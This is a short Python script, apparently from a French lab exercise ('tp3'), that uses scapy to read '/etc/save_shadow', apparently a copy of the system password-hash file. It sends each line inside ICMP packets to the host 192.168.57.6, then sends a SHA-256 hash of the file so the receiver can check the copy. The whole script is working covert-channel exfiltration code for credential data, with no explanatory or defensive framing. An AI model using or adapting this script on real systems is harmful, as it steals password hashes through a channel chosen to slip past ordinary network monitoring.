from scapy import all as scapy
import time
import hashlib

f = open("/etc/save_shadow", "r")

def hash_file(filename):
   h = hashlib.sha256()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)
   return h.hexdigest()

hash_value = hash_file("/etc/save_shadow")

for ligne in f:
    scapy.send(scapy.IP(dst="192.168.57.6")/scapy.ICMP()/("[tp3]" + ligne))
    print('Ligne envoyée en ICMP : ' + ligne)
    time.sleep(1)

print('Envoi du hash : ' + hash_value)
scapy.send(scapy.IP(dst="192.168.57.6")/scapy.ICMP()/("[hash]" + hash_value))
